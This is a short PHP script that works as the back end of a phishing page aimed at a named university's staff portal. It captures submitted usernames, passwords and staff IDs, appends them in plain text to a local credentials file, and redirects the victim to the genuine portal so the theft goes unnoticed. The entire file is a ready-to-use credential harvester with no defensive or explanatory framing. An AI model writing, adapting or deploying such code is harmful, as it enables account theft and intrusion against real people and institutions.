<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = 'credentials.txt';

    // Retrieve form data
    $username = $_POST['UserName'];
    $password = $_POST['Password'];
    $staffId = $_POST['StaffId'];

    // Append credentials to the file
    $data = "Username: $username\nPassword: $password\nStaff ID: $staffId\n\n";
    file_put_contents($file, $data, FILE_APPEND);

    // Redirect user to the original page
    header("Location: https://apps.knust.edu.gh/staff");
    exit();
}
?>
